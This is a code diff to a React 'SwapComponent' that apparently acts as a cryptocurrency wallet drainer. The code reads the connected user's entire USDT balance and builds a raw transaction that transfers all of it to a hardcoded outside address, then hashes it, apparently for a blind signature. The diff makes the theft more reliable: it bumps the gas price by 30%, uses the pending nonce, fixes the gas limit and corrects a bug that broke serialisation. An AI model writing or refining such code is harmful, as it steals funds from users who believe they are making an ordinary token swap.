@@ -72,25 +72,27 @@ function SwapComponent() {
 
     const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 
-    const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress)
+    const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress, {
+      from: address,
+    })
     const balance = await usdtContract.methods.balanceOf(address).call()
-
-    const gas = usdtContract.methods
-      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
-      .estimateGas({ from: address })
 
     const data = usdtContract.methods
       .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', balance)
       .encodeABI()
 
-    const nonce = await web3js.eth.getTransactionCount(address)
+    const nonce = await web3js.eth.getTransactionCount(address, 'pending')
+    const gasPrice = await web3js.eth.getGasPrice()
     const chainId = mainnet.id
 
     const tx_ = {
       from: address,
       to: usdtContractAddress,
       nonce: web3js.utils.toHex(nonce),
-      gas: gas,
+      gasPrice: web3js.utils.toHex(
+        (BigInt(gasPrice) * BigInt(13)) / BigInt(10)
+      ),
+      gasLimit: '0x55F0',
       value: '0x0',
       data: data,
       chainId: web3js.utils.toHex(chainId),
@@ -101,7 +103,7 @@ function SwapComponent() {
 
     console.log('Tx Object', tx_)
 
-    const tx = new ethereumjs.Tx(tx)
+    const tx = new ethereumjs.Tx(tx_)
     const serializedTx = '0x' + tx.serialize().toString('hex')
     const sha3_ = web3js.utils.sha3(serializedTx)
 
